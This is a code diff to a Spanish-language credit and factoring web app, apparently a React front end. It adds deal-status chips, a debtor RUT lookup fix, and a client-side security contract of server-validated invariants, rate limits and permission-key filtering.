+                      const facsC = (!d.agrupado && d.facturasOp && d.facturasOp.length) ? d.facturasOp : null;
+                      const visC = aplicaGates ? visadoDeal(d) : null;
+                      const bloqueoC = visC && (visC.rechFirme.length || visC.excRech.length);
+                      const nPendC = visC && !bloqueoC ? visC.exc.length + visC.rechReev.length : 0;
+                      // Total de criterios evaluados, para que el badge diga «16/321» y no un 16 suelto.
+                      const totCrit = visC ? (visC.aprob + visC.clasif + visC.exc.length + visC.rech.length) : 0;
+                      // Estado de LÍNEA: se usa el MISMO motor que el detalle, para que el tubo y la
+                      // pantalla no puedan discrepar sobre el mismo negocio.
+                      const ev = (facsC && d.rutEmisor) ? asignarLineas(facsC, d.rutEmisor) : null;
+                      // Sin facturas itemizadas la única lectura posible es el monto contra la línea
+                      // disponible del cliente; se dice en el tooltip para no confundirla con la
+                      // evaluación por deudor.
+                      const evCli = (!ev && d.amountMM > 0 && !d.agrupado) ? lineaCreditoDe(d) : null;
+                      // VERIFICACIÓN: sale del estado cacheado del par cliente-deudor, no de la
+                      // simulación. Con la oferta armada se cuenta por FACTURA, que es la unidad que el
+                      // ejecutivo ve en la lista; el tooltip aclara que una llamada cubre al deudor.
+                      const deudV = (!d.agrupado && d.deudores && d.deudores.length) ? d.deudores : null;
+                      const nVerif = facsC ? facsC.filter((f) => verifFactura(f, d).est !== "ok").length
+                        : (deudV ? deudV.filter((x) => x && x.name && verifDeudorDeal(d, x.name, x.montoMM || 0).requiere).length : 0);
+                      const chip = (key, fg, bg, Icono, txt, tip, badge) => <ChipCond key={key} fg={fg} bg={bg} Icono={Icono} texto={txt} tip={tip} badge={badge} />;
+                      const chips = [];
+                      if (evCli) {
+                        const cabe = evCli.aprobada > 0 && d.amountMM <= evCli.disponible;
+                        const tip = evCli.aprobada <= 0
+                          ? "El cliente aún no tiene línea asignada por comité."
+                          : `Contrastado contra la línea disponible del cliente (${fmtMM(evCli.disponible)}). La evaluación por deudor se hace al detallar las facturas de la oferta.`;
+                        chips.push(evCli.aprobada <= 0
+                          ? chip("lin", "#6B7280", "#F3F4F6", AlertTriangle, "Sin línea asignada", tip)
+                          : cabe ? chip("lin", "#16A34A", "#F0FDF4", Check, "Dentro de línea", tip, fmtMM(d.amountMM))
+                          : chip("lin", "#7C3AED", C.lilac, AlertTriangle, "Excede la línea", tip, fmtMM(d.amountMM - evCli.disponible)));
+                      }
+                      if (ev && !ev.vacia) {
+                        const totOf = +(ev.cursable + ev.requiereComite).toFixed(1);
+                        const li = ev.requiereComite === 0 ? { fg: "#16A34A", bg: "#F0FDF4", Ico: Check, txt: "Dentro de línea", badge: fmtMM(ev.cursable) }
+                          : ev.cursable === 0 ? { fg: "#EF4444", bg: "#FEF2F2", Ico: AlertTriangle, txt: "Todo a comité", badge: `${fmtMM(ev.requiereComite)} / ${fmtMM(totOf)}` }
+                          : { fg: "#7C3AED", bg: C.lilac, Ico: AlertTriangle, txt: "Requiere comité", badge: `${fmtMM(ev.requiereComite)} / ${fmtMM(totOf)}` };
+                        const tipLin = (ev.requiereComite > 0 ? `Cursable hoy ${fmtMM(ev.cursable)} · a comité ${fmtMM(ev.requiereComite)} sobre ${fmtMM(totOf)} de oferta.\n` : "")
+                          + (ev.solicitudes.length
+                            ? "Se le pediría al comité:\n" + ev.solicitudes.map((x) => `· ${x.pide} — ${x.deudor} ${fmtMM(x.monto)} (${x.alcance.toLowerCase()})`).join("\n")
+                            : "Toda la oferta cabe en la línea de crédito vigente.");
+                        chips.push(chip("lin", li.fg, li.bg, li.Ico, li.txt, tipLin, li.badge));
+                      }
+                      if (aplicaGates && visC && !bloqueoC) {
+                        chips.push(nPendC > 0
+                          ? chip("otg", "#7C3AED", "#f5f3ff", AlertTriangle, "Requiere otorgamiento",
+                              `${nPendC} de ${totCrit} criterios con excepción o rechazo re-evaluable:\n` + [...visC.exc, ...visC.rechReev].map((e, i) => `${i + 1}) #${e.n} ${e.nombre}`).join("\n"),
+                              `${nPendC}/${totCrit} criterios`)
+                          : chip("otg", "#16A34A", "#F0FDF4", Check, "Otorgamiento aprobado", `Los ${totCrit} criterios del motor de otorgamiento cumplen.`));
+                      }
+                      if (facsC || deudV) {
+                        const uni = facsC ? "factura" : "deudor";
+                        const tot = facsC ? facsC.length : deudV.length;
+                        // Mismo violeta que comité y otorgamiento: las tres son compuertas PENDIENTES
+                        // del mismo tipo y con tres colores se leían como tres severidades distintas.
+                        // El rojo queda para el estado extremo («Todo a comité»), que nunca convive con
+                        // estos, y el verde para las resueltas.
+                        chips.push(nVerif > 0
+                          ? chip("ver", "#7C3AED", "#f5f3ff", AlertTriangle, "Requiere verificación",
+                              `${nVerif} de ${tot} ${uni}(s) exigen verificación telefónica con el deudor antes de girar. Una llamada cubre todas las facturas de ese deudor.`,
+                              `${nVerif} ${uni}${nVerif === 1 ? "" : "s"}`)
+                          : chip("ver", "#16A34A", "#F0FDF4", Check, "Verificada", "Ninguna factura de la oferta requiere verificación telefónica."));
+                      }
+                      // Composición de la oferta: de quién es lo que se está cotizando.
+                      const nombres = facsC
+                        ? [...new Set(facsC.map((f) => f && f.deudor).filter(Boolean))]
+                        : (d.deudores || []).map((x) => x && x.name).filter(Boolean);
+                      // Los cuatro bloques van en UNA fila, separados por filetes como el diseño. El de
+                      // compuertas no envuelve hacia abajo: con `shrink-0` es el que impone el ancho, y
+                      // los dos del medio ceden truncando —el detalle completo está en sus tooltips.
+                      // TRES bloques, no cuatro: monto · qué se cotiza · qué falta. El conteo de deudores
+                      // y facturas encabeza el bloque de condiciones en vez de tener columna propia, y las
+                      // RAZONES SOCIALES salen de la celda —eran la línea más ancha del panel y la que lo
+                      // empujaba a ocupar media tabla—. No se pierden: van en el tooltip de esa línea.
+                      const sep = { borderLeft: `1px solid ${C.line}`, paddingLeft: 16 };
+                      return (
+                        <div className="flex items-center gap-4">
+                          {/* Todo el panel va centrado verticalmente: el bloque de chips es el más alto
+                              y fija la altura; el monto y las condiciones, pegados al borde superior,
+                              quedaban flotando sobre el aire de abajo. */}
+                          <div className="t14 font-bold shrink-0 text-center" style={{ color: C.ink, minWidth: 104 }}>{fmtMM(d.amountMM)}</div>
+                          <div className="t10 leading-5 min-w-0" style={{ color: C.sub, ...sep }}>
+                            <div className="truncate" title={nombres.length ? `Deudores de la oferta: ${nombres.join(" · ")}` : undefined} style={{ cursor: nombres.length ? "help" : "default" }}>
+                              <span className="font-semibold" style={{ color: C.ink }}>{nombres.length || d.facturas}</span> deudor{(nombres.length || 1) === 1 ? "" : "es"} · <span className="font-semibold" style={{ color: C.ink }}>{d.facturas}</span> factura{d.facturas === 1 ? "" : "s"}
+                            </div>
+                            <div className="truncate">Tasa <b style={{ color: C.ink }}>{d.tasa}</b> · Anticipo {d.anticipo} · {d.diasFin}d</div>
+                            <div className="truncate">Giro <b style={{ color: C.green }}>{fmtMM(d.giroMM)}</b> · Desc. {fmtMM(d.descMM)} · Com. {fmtCLP(d.comision)}</div>
+                          </div>
+                          {/* Chips alineados a la IZQUIERDA: centrados, sus anchos distintos dejaban los
+                              tres íconos ⚠ en tres verticales distintas y la columna perdía su borde. */}
+                          {chips.length > 0 && <div className="flex flex-col items-start gap-1 shrink-0" style={sep}>{chips}</div>}
+                        </div>
+                      );
+                    })()}
+                  </div>
                 </td>
                 {/* Asignar a ejecutivo — sólo en "Otras Empresas" (jefatura asigna las facturas sin dueño) */}
                 {modoAsignar && (
@@ -8075,7 +9608,15 @@ function deudoresDeDeal(deal) {
   const out = [], seen = new Set();
   const add = (nombre, rut) => { if (!nombre) return; const k = rut || nombre; if (seen.has(k)) return; seen.add(k); out.push({ nombre, rut: rut || "" }); };
   if (deal && deal.facturasOp && deal.facturasOp.length) deal.facturasOp.forEach((f) => add(f.deudor, f.rutRecep));
-  else if (deal && deal.deudores && deal.deudores.length) deal.deudores.forEach((d) => add(d.name || d.nombre, d.rut));
+  else if (deal && deal.deudores && deal.deudores.length) {
+    // `deal.deudores` guarda nombre, facturas y monto, pero NO el RUT. Desde que la oferta nace
+    // vacía esta rama es la que manda, y un deudor sin RUT es, para el motor, un deudor distinto:
+    // no calza con su línea del par, cae a la de otros deudores y el desglose termina mostrando
+    // las dos a la vez. El RUT se rescata del pool disponible, que sí lo trae en cada factura.
+    const rutPorNombre = {};
+    (deal.facturasDisponibles || []).forEach((f) => { if (f && f.deudor && f.rutRecep && !rutPorNombre[f.deudor]) rutPorNombre[f.deudor] = f.rutRecep; });
+    deal.deudores.forEach((d) => { const n = d.name || d.nombre; add(n, d.rut || rutPorNombre[n]); });
+  }
   else if (deal && deal.deudor) add(deal.deudor, null);
   return out.length ? out : [{ nombre: (deal && deal.deudor) || "Deudor", rut: "" }];
 }
@@ -8437,25 +9978,162 @@ function otorgamientoCompleto(deal) {
 //     si falla, o manejar un 409 cuando dos apoderados deciden a la vez.
 // Cuando exista la API, lo único que cambia es el cuerpo de `confirmar`: en vez de un timer, la
 // llamada real; y `revertir` deja de ser un no-op para volver la cache al valor previo.
+// ============================================================
+// A04 — INSECURE DESIGN · CONTRATO DE VALIDACIÓN DEL SERVIDOR
+// ============================================================
+// El riesgo de A04 en esta app es estructural, no un bug puntual: TODA la regla de negocio vive en el
+// cliente, y un cliente es código que el usuario controla. Con la consola abierta se puede invocar
+// cualquier mutación con el payload que se quiera —aprobar una excepción sin atribución, cursar sin
+// verificar, girar sin cesión, armar una operación sobre la línea— y hoy nada del otro lado lo impide.
+//
+// Este bloque NO convierte el cliente en un control de seguridad (no puede: el atacante ES el cliente).
+// Lo que hace es escribir el CONTRATO en un solo lugar, con códigos estables, para que:
+//   1. el resolver GraphQL lo implemente 1:1 y devuelva el MISMO código de error;
+//   2. la UI pueda anticipar el rechazo sin inventar mensajes;
+//   3. quede auditable qué invariante existe, quién la hace cumplir de verdad y dónde se aplica hoy.
+// Cada invariante declara su AUTORIDAD: "servidor" = la decisión es del backend y lo de acá es sólo
+// anticipación; "cliente" = conveniencia de UX sin consecuencia si se salta.
+const CONTRATO_VERSION = "2026-09-02.1";
+// Topes holgados a propósito: el objetivo del límite es cortar automatización, no frenar la operación
+// normal (ni la simulación del demo, que escribe en ráfagas). El tope REAL lo fija el servidor.
+// Los repositorios que se escriben SIEMPRE juntos comparten bucket: con topes separados, el de una
+// tabla se agotaba antes que el de la otra y la escritura pareada quedaba a medias (estado sin
+// respaldo, o respaldo sin estado). El tope de la familia cubre las dos escrituras de cada decisión.
+const CONTRATO_FAMILIA = { otorgamiento_visado: "visado", otorgamiento_visado_detalle: "visado" };
+const CONTRATO_LIMITES = { ventanaMs: 60000, porMinuto: { default: 900, visado: 600, simulacion_version: 300 }, idemVentanaMs: 3000 };
+const INVARIANTES = [
+  { codigo: "TEN-01", nombre: "Aislamiento por tenant", autoridad: "servidor", aplicado: "repositorio", mutaciones: ["*"],
+    regla: "Toda mutación usa el tenant fijado al abrir la sesión; si el tenant activo cambió sin re-autenticar, se rechaza.",
+    servidor: "RLS en Postgres: policy USING (tenant_id = current_setting('app.tenant')). El resolver NUNCA acepta el tenant como parámetro: lo toma del token." },
+  { codigo: "RAT-01", nombre: "Límite de tasa por usuario", autoridad: "servidor", aplicado: "repositorio", mutaciones: ["*"],
+    regla: "Máximo de mutaciones por minuto y por (usuario, colección).",
+    servidor: "Token bucket en el gateway por sub del JWT + costo por operación GraphQL; 429 con Retry-After." },
+  { codigo: "IDM-01", nombre: "Idempotencia de la mutación", autoridad: "servidor", aplicado: "observado", mutaciones: ["*"],
+    regla: "La misma mutación no se aplica dos veces. Acá sólo se CUENTAN los duplicados: la idempotencia real necesita una clave generada por el cliente, que este código todavía no emite.",
+    servidor: "Tabla mutacion_aplicada(clave PK, ts) + INSERT ... ON CONFLICT DO NOTHING en la misma transacción de la escritura." },
+  { codigo: "LIN-01", nombre: "La operación no supera la línea disponible", autoridad: "servidor", aplicado: "motor", mutaciones: ["oportunidad.crear", "oportunidad.incorporarFacturas"],
+    regla: "El monto de la operación tiene que caber en la línea disponible del cliente al momento de armarla.",
+    servidor: "SELECT ... FOR UPDATE sobre la línea + recálculo del uso en la misma transacción: sin lock, dos operaciones simultáneas pasan el chequeo y juntas exceden el cupo.",
+    evaluar: (p) => { const lc = lineaCreditoDe(p.deal); return (p.montoMM != null ? p.montoMM : lc.montoOp) <= lc.disponible + 0.001; } },
+  { codigo: "OTG-01", nombre: "Sólo aprueba quien tiene atribución", autoridad: "servidor", aplicado: "ui", mutaciones: ["excepcion.aprobar", "excepcion.rechazar"],
+    regla: "La excepción la resuelve un apoderado con atribución en el área y nivel que la regla exige.",
+    servidor: "El resolver recalcula la atribución desde el rol del token, no desde el payload. La UI que oculta el botón no es el control.",
+    evaluar: (p) => puedeAprobarExc(p.usuario, p.regla, p.nivel) },
+  { codigo: "OTG-02", nombre: "No avanza a Cesión con excepciones pendientes", autoridad: "servidor", aplicado: "ui", mutaciones: ["oportunidad.avanzarEtapa"],
+    regla: "Con excepciones o rechazos re-evaluables sin resolver, la operación no puede pasar a Cesión.",
+    servidor: "Transición de estado validada en el servidor contra la máquina de estados; el stage no se acepta como dato del cliente.",
+    evaluar: (p) => { const v = visadoDeal(p.deal); return (v.excPend.length + v.rechReev.length) === 0; } },
+  { codigo: "VER-01", nombre: "No cursa con verificación pendiente", autoridad: "servidor", aplicado: "ui", mutaciones: ["oportunidad.cursar"],
+    regla: "Todas las facturas de la operación tienen que tener su verificación telefónica completa.",
+    servidor: "El resolver de curse cuenta las verificaciones en estado final; si falta una, 409 con el detalle.",
+    evaluar: (p) => verifResumenDeal(p.deal).pend === 0 },
+  { codigo: "GIR-01", nombre: "No gira sin pasar por Cesión", autoridad: "servidor", aplicado: "ui", mutaciones: ["oportunidad.girar"],
+    regla: "El desembolso exige que la operación haya pasado por Cesión (documentos cedidos a Security).",
+    servidor: "El giro se emite contra el AEC confirmado, no contra el stage que reporta el cliente.",
+    evaluar: (p) => ["cesion", "giro"].includes(p.deal.stage) },
+  { codigo: "ATR-01", nombre: "Descuento dentro de la atribución", autoridad: "servidor", aplicado: "ui", mutaciones: ["condiciones.guardar"],
+    regla: "El descuento aplicado no puede exceder la atribución del rol sin autorización de la jefatura correspondiente.",
+    servidor: "El resolver recalcula la banda de tasa y la atribución del rol del token; el % máximo no viaja en el payload.",
+    evaluar: (p) => (p.pctDesc || 0) <= (p.pctMax || 0) + 0.001 },
+  { codigo: "CRY-01", nombre: "El hash del OTP no sale del servidor", autoridad: "servidor", aplicado: "funcion", mutaciones: ["otp.emitir", "otp.validar"],
+    regla: "El OTP se guarda como SHA-256 con sal por emisión; el hash nunca viaja al cliente ni a otra página. La validación ocurre server-side, con límite de intentos y TTL.",
+    servidor: "Tabla otp(neg, sal, hash, exp, usado) sin exponer en el esquema GraphQL. La comparación va en tiempo constante y el intento fallido consume cupo del rate limit por cuenta." },
+  { codigo: "PRI-01", nombre: "La prioridad de curse la pide una jefatura", autoridad: "servidor", aplicado: "funcion", mutaciones: ["prioridadCurse.set"],
+    regla: "Marcar una oportunidad como prioritaria es una instrucción de jefatura, no del ejecutivo dueño del negocio.",
+    servidor: "Autorización por rol en el resolver; el ejecutivo puede leer la prioridad pero no crearla.",
+    evaluar: (p) => esJefeComercial(p.usuario) },
+];
+const CONTRATO_RECHAZOS = {}; // { [codigo]: n } — rechazos de la sesión, para el visor
+const RATE_BUCKETS = {};
+const IDEM_APLICADAS = new Map();
+const invarianteDe = (codigo) => INVARIANTES.find((x) => x.codigo === codigo);
+const invariantesDe = (tipo) => INVARIANTES.filter((i) => i.mutaciones.includes("*") || i.mutaciones.includes(tipo));
+function registrarRechazo(inv, mutacion, datos) {
+  if (!inv) return;
+  CONTRATO_RECHAZOS[inv.codigo] = (CONTRATO_RECHAZOS[inv.codigo] || 0) + 1;
+  logSys("warn", "contrato", `${inv.codigo} · ${inv.nombre} rechazó ${mutacion}`, { codigo: inv.codigo, mutacion, autoridad: inv.autoridad, ...(datos || {}) });
+}
+// Valida una mutación contra las invariantes que la cubren. Devuelve los códigos violados para que la
+// UI muestre el motivo real; un evaluador que revienta NO bloquea la operación (el control es del
+// servidor, y un bug acá no puede dejar al ejecutivo sin poder trabajar).
+function validarMutacion(tipo, payload) {
+  const violaciones = [];
+  for (const inv of invariantesDe(tipo)) {
+    if (typeof inv.evaluar !== "function") continue;
+    let ok = true;
+    try { ok = inv.evaluar(payload || {}) !== false; } catch (e) { ok = true; logSys("error", "contrato", `Evaluador de ${inv.codigo} falló: ${e.message}`, { codigo: inv.codigo, mutacion: tipo }); }
+    if (!ok) { violaciones.push({ codigo: inv.codigo, nombre: inv.nombre, regla: inv.regla }); registrarRechazo(inv, tipo, {}); }
+  }
+  return { ok: violaciones.length === 0, violaciones, contrato: CONTRATO_VERSION };
+}
+function limiteTasa(clave, porMinuto) {
+  const ahora = Date.now();
+  const b = RATE_BUCKETS[clave] || (RATE_BUCKETS[clave] = []);
+  while (b.length && ahora - b[0] > CONTRATO_LIMITES.ventanaMs) b.shift();
+  if (b.length >= porMinuto) return false;
+  b.push(ahora); return true;
+}
+function esDuplicada(repo, op, id, valor) {
+  const clave = `${repo}|${op}|${id}|${hashStr(JSON.stringify(valor === undefined ? null : valor))}`;
+  const ahora = Date.now();
+  for (const [k, ts] of IDEM_APLICADAS) if (ahora - ts > CONTRATO_LIMITES.idemVentanaMs) IDEM_APLICADAS.delete(k);
+  if (IDEM_APLICADAS.has(clave)) return true;
+  IDEM_APLICADAS.set(clave, ahora); return false;
+}
 const LATENCIA_MUTACION_MS = 120; // latencia simulada: obliga a que la UI trate la escritura como algo que TARDA
 const REPOS = {};
 function crearRepo(nombre) {
   const datos = {}; // { [tenantId]: { [id]: valor } } — el scope por tenant es la futura columna tenant_id
   const tabla = (t) => (datos[t || TENANT_ACTUAL] = datos[t || TENANT_ACTUAL] || {});
   const confirmar = (op, id) => new Promise((res) => setTimeout(() => res({ ok: true, repo: nombre, op, id }), LATENCIA_MUTACION_MS));
+  const rechazo = (codigo, op, id) => Promise.resolve({ ok: false, codigo, repo: nombre, op, id, contrato: CONTRATO_VERSION });
+  // Gate del contrato (A04) para las invariantes TRANSVERSALES: son las que no dependen del dominio y
+  // se pueden hacer cumplir en la capa de datos. El servidor real hará esto mismo; acá se anticipa para
+  // que el rechazo sea visible y para que el código de error viva en un solo lugar.
+  const gate = (op, id, valor) => {
+    if (SESION && SESION.tenant && SESION.tenant !== TENANT_ACTUAL) {
+      registrarRechazo(invarianteDe("TEN-01"), `${nombre}.${op}`, { sesion: SESION.tenant, activo: TENANT_ACTUAL, id });
+      return "TEN-01";
+    }
+    const familia = CONTRATO_FAMILIA[nombre] || nombre;
+    const tope = CONTRATO_LIMITES.porMinuto[familia] || CONTRATO_LIMITES.porMinuto.default;
+    if (!limiteTasa(`${(SESION && SESION.usuario) || "anon"}|${familia}`, tope)) {
+      registrarRechazo(invarianteDe("RAT-01"), `${nombre}.${op}`, { tope, familia, id });
+      return "RAT-01";
+    }
+    // IDM-01 es OBSERVADO, no bloqueante: sin clave de mutación del cliente, bloquear un duplicado
+    // legítimo (el motor escribiendo el mismo valor dos veces) rompería la operación.
+    if (esDuplicada(nombre, op, id, valor)) registrarRechazo(invarianteDe("IDM-01"), `${nombre}.${op}`, { id, observado: true });
+    return null;
+  };
   const r = {
     nombre,
     // Lecturas (cache local)
     get: (id) => tabla()[id],
     all: (t) => tabla(t),
     // Escrituras (optimistas; la promesa es la confirmación del servidor)
-    set(id, valor) { tabla()[id] = valor; return confirmar("set", id); },
-    patch(id, parcial) { const t = tabla(); t[id] = { ...(t[id] || {}), ...parcial }; return confirmar("patch", id); },
-    del(id) { delete tabla()[id]; return confirmar("del", id); },
-    push(id, item) { const t = tabla(); (t[id] = t[id] || []).push(item); return confirmar("push", id); },
+    set(id, valor) { const v = gate("set", id, valor); if (v) return rechazo(v, "set", id); tabla()[id] = valor; return confirmar("set", id); },
+    patch(id, parcial) { const v = gate("patch", id, parcial); if (v) return rechazo(v, "patch", id); const t = tabla(); t[id] = { ...(t[id] || {}), ...parcial }; return confirmar("patch", id); },
+    del(id) { const v = gate("del", id, null); if (v) return rechazo(v, "del", id); delete tabla()[id]; return confirmar("del", id); },
+    push(id, item) { const v = gate("push", id, item); if (v) return rechazo(v, "push", id); const t = tabla(); (t[id] = t[id] || []).push(item); return confirmar("push", id); },
   };
   REPOS[nombre] = r;
   return r;
+}
+// Confirma un conjunto de escrituras. El repositorio NO rechaza con un reject —devuelve una promesa
+// resuelta con {ok:false}— justamente para que el llamador decida qué hacer; el problema es que nadie
+// lo miraba. Sin esto, un rechazo del gate del contrato dejaba la decisión sin aplicar y la auditoría
+// y la bitácora regulatoria afirmando lo contrario.
+// Devuelve además `partida:true` cuando unas escrituras del lote pasaron y otras no: es un estado
+// inconsistente que hay que poder rastrear (en el servidor esto es una transacción; acá no puede serlo).
+async function confirmarEscrituras(promesas) {
+  const res = await Promise.all(promesas);
+  const malas = res.filter((r) => r && r.ok === false);
+  if (!malas.length) return { ok: true };
+  const m = malas[0];
+  const partida = malas.length < res.length;
+  logSys("error", "repositorio", `Escritura rechazada (${m.codigo}) en ${m.repo}.${m.op}: la operación NO se aplicó${partida ? " · el lote quedó PARTIDO: otra escritura del mismo grupo sí pasó" : ""}`, { codigo: m.codigo, repo: m.repo, op: m.op, id: m.id, partida });
+  return { ok: false, codigo: m.codigo, repo: m.repo, partida };
 }
 // Repositorios del otorgamiento. Los alias `VISADO_STATE`/`VISADO_DETALLE`/… apuntan a la tabla del
 // tenant activo, de modo que el código existente sigue leyendo igual; las ESCRITURAS ya pasan por el
@@ -8502,10 +10180,23 @@ const PERMISOS_DEFAULT = {
   verPlanEjec: {}, verFunnel: {},                                    // reportes de Gestión: ocultos por defecto
   aprobMasiva: {},                                                   // "Aprobar/Rechazar todo": habilitada salvo desmarca explícita
 };
+// Los permisos vienen de localStorage, que el usuario edita a mano. Mezclarlos a ciegas deja entrar
+// claves que el código nunca declaró (incluido un `__proto__` propio, que ensucia cualquier recorrido
+// posterior de claves). Se copian SÓLO las que existen en el default: si mañana aparece un permiso
+// nuevo en el storage y no está en el código, es basura o es un intento, y en ninguno de los dos casos
+// se usa.
 function cargarPermisos() {
   const base = JSON.parse(JSON.stringify(PERMISOS_DEFAULT));
   const guardado = leerVersionado(PERMISOS_KEY, "permisos", null);
-  return guardado && typeof guardado === "object" ? { ...base, ...guardado } : base;
+  if (!guardado || typeof guardado !== "object") return base;
+  let ignoradas = 0;
+  for (const k of Object.keys(guardado)) {
+    if (!Object.prototype.hasOwnProperty.call(base, k)) { ignoradas++; continue; }
+    const v = guardado[k];
+    if (v && typeof v === "object" && !Array.isArray(v)) base[k] = v;
+  }
+  if (ignoradas) logSys("warn", "storage", `Permisos: se ignoraron ${ignoradas} clave(s) desconocida(s) del almacenamiento local`, { ignoradas });
+  return base;
 }
 let PERMISOS = cargarPermisos();
 function guardarPermisos() { escribirVersionado(PERMISOS_KEY, "permisos", PERMISOS); }
@@ -8544,8 +10235,14 @@ const esJefeComercial = (code) => code === "ADMIN" || atribDe(code).atrib.comerc
 // Gerente Comercial (o superior): atribución comercial N2+ (autoriza descuentos sobre el máximo de jefatura).
 const esGerenteComercial = (code) => code === "ADMIN" || (atribDe(code).atrib.comercial != null && atribDe(code).atrib.comercial >= 2);
 function setPrioridadCurse(dealId, code, on) {
-  if (on) PRIORIDAD_CURSE[dealId] = { por: code, porNombre: USERS[code] || code, ts: nowStamp() };
-  else delete PRIORIDAD_CURSE[dealId];
+  // PRI-01 del contrato: el chequeo va en la FUNCIÓN, no sólo en el botón. Ocultar el control en la UI
+  // no impide llamar a esto desde la consola, y así al menos queda registrado el intento con su código.
+  if (on) {
+    const v = validarMutacion("prioridadCurse.set", { usuario: code, dealId });
+    if (!v.ok) return false;
+    PRIORIDAD_CURSE[dealId] = { por: code, porNombre: USERS[code] || code, ts: nowStamp() };
+  } else delete PRIORIDAD_CURSE[dealId];
+  return true;
 }
 const tienePrioridadCurse = (dealId) => !!PRIORIDAD_CURSE[dealId];
 // Estado de atención de una oportunidad marcada con prioridad de curse. Una prioridad se "atiende"
@@ -8556,7 +10253,7 @@ function estadoAtencionPrioridad(deal) {
   if (!deal) return { k: "pendiente", label: "Pendiente de gestión", atendida: false, col: "#703EFF", bg: "#F1ECFF" };
   if (["aceptadas", "cesion", "giro"].includes(deal.stage)) return { k: "cursada", label: "Cursada", atendida: true, detalle: "El cliente aceptó y la operación se está cursando.", col: "#16A34A", bg: "#F0FDF4" };
   const bi = bloqueoFirmeInfo(deal);
-  if (bi) return { k: "bloqueo", label: "Bloqueo fuerte de otorgamiento", atendida: true, detalle: bi.causa, col: "#DC2626", bg: "#FEF2F2" };
+  if (bi) return { k: "bloqueo", label: "Bloqueo fuerte de otorgamiento", atendida: true, detalle: bi.causa, col: "#EF4444", bg: "#FEF2F2" };
   if (deal.stage === "perdida") {
     if (deal.perdidaCesion || deal.cedidaCompetidor || /cesión externa|competencia/i.test(causaPerdidaDeal(deal))) return { k: "cedida", label: "Cedida a otro factoring", atendida: true, detalle: causaPerdidaDeal(deal), col: "#C2410C", bg: "#FFF7ED" };
     return { k: "perdida", label: "Perdida", atendida: true, detalle: causaPerdidaDeal(deal), col: "#C2410C", bg: "#FFF7ED" };
@@ -8596,17 +10293,19 @@ function excepcionesSinComentario(deal) {
   const sol = (typeof SOLICITUD_EXC !== "undefined" && SOLICITUD_EXC[deal.id]) || {};
   return evaluarOtorgItems(deal)
     .filter((it) => it.disp === "excepcion" && !st[it.stKey])
-    .filter((it) => { const s = sol[it.stKey]; return !s || (!((s.comentario || "").trim()) && !(s.archivos && s.archivos.length)); });
+    // Resuelta = solicitada CON justificación: comentario, respaldo, o la declaración explícita de
+    // que no hay comentarios adicionales. El silencio no cuenta.
+    .filter((it) => { const s = sol[it.stKey]; return !s || (!((s.comentario || "").trim()) && !(s.archivos && s.archivos.length) && !s.sinComentarios); });
 }
 // El EJECUTIVO solicita al apoderado responsable (N1–N5) la aprobación de UNA excepción, adjuntando su
 // comentario y archivos de respaldo. Guarda la solicitud, adelanta la operación a la bandeja (pre-eval),
 // registra auditoría/bitácora, avisa por Mensajería interna y genera una tarea a los apoderados hábiles.
-function solicitarAprobacionExc(deal, x, execCode, comentario, archivos) {
+function solicitarAprobacionExc(deal, x, execCode, comentario, archivos, sinComentarios) {
   if (!x || !x.stKey || !x.regla) return;
   const nr = NIVEL_ROL[x.nivel] || NIVEL_ROL[4];
   // Escritura optimista + confirmación (la promesa no se espera aquí: la función es síncrona por sus
   // muchos call sites; el punto de await queda listo para cuando la mutation sea real).
-  const sol = { ...(repoSolicitudExc.get(deal.id) || {}), [x.stKey]: { comentario: comentario || "", archivos: (archivos || []).slice(), por: USERS[execCode] || execCode, porCode: execCode, fecha: new Date().toLocaleString("es-CL"), nivel: x.nivel || 4, rol: nr.rol } };
+  const sol = { ...(repoSolicitudExc.get(deal.id) || {}), [x.stKey]: { comentario: comentario || "", archivos: (archivos || []).slice(), sinComentarios: !!sinComentarios, por: USERS[execCode] || execCode, porCode: execCode, fecha: new Date().toLocaleString("es-CL"), nivel: x.nivel || 4, rol: nr.rol } };
   repoSolicitudExc.set(deal.id, sol);
   if (!tienePreEval(deal.id)) setPreEval(deal.id, execCode, true); // habilita la bandeja para que el apoderado pueda visar
   const dtxt = x.deudor ? ` · deudor ${x.deudor.nombre}` : "";
@@ -8618,7 +10317,7 @@ function solicitarAprobacionExc(deal, x, execCode, comentario, archivos) {
   const prev = hilosDeDeal(deal.id).find((h) => h.asunto === asunto);
   const h = prev || hiloNuevo({ tipo: "requerimiento", dealId: deal.id, cliente: deal.cliente, asunto, participantes: [execCode, ...dests], creadoPor: execCode });
   dests.forEach((c) => { if (!h.participantes.includes(c)) h.participantes.push(c); });
-  hiloEnviar(h, execCode, `${USERS[execCode] || execCode} solicita tu aprobación de la excepción #${x.regla.n} ${x.regla.nombre}${dtxt} de ${deal.cliente} (${deal.id}). ${comentario ? "“" + comentario + "” " : ""}${(archivos && archivos.length) ? "Adjunta " + archivos.length + " respaldo(s). " : ""}Revísala en el Otorgamiento de la operación.`.trim(), (archivos && archivos[0]) || null);
+  hiloEnviar(h, execCode, `${USERS[execCode] || execCode} solicita tu aprobación de la excepción #${x.regla.n} ${x.regla.nombre}${dtxt} de ${deal.cliente} (${deal.id}). ${comentario ? "“" + comentario + "” " : ""}${(archivos && archivos.length) ? "Adjunta " + archivos.length + " respaldo(s). " : ""}${(!comentario && !(archivos && archivos.length) && sinComentarios) ? "Declaró no tener comentarios adicionales. " : ""}Revísala en el Otorgamiento de la operación.`.trim(), (archivos && archivos[0]) || null);
   if (dests.length) addPanelTarea({ texto: `Aprobar excepción #${x.regla.n} ${x.regla.nombre}${dtxt} · ${deal.cliente} · ${nr.rol} (N${x.nivel || 4}) · solicitada por ${(USERS[execCode] || execCode).split(" · ")[0]}`, cat: "cerrar", autor: USERS[execCode] || execCode, para: dests.map((c) => (USERS[c] || c).split(" · ")[0]), ops: [deal.id], nodo: "Otorgamiento" });
 }
 // Fase de otorgamiento de una oportunidad: "preevaluacion" | "evaluacion" | "finalizada" | null.
@@ -8725,8 +10424,13 @@ function VisadoClienteView({ deals, usuario, onChange }) {
     const k = x.stKey, area = x.regla.area, nivel = x.nivel || 4;
     const st = { ...(repoVisado.get(deal.id) || {}), [k]: val };
     const det = { ...(repoVisadoDetalle.get(deal.id) || {}), [k]: { msg: msg || "", arch: arch || null, por: USERS[usuario] || usuario, fecha: new Date().toLocaleString("es-CL") } };
-    await Promise.all([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    const conf = await confirmarEscrituras([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
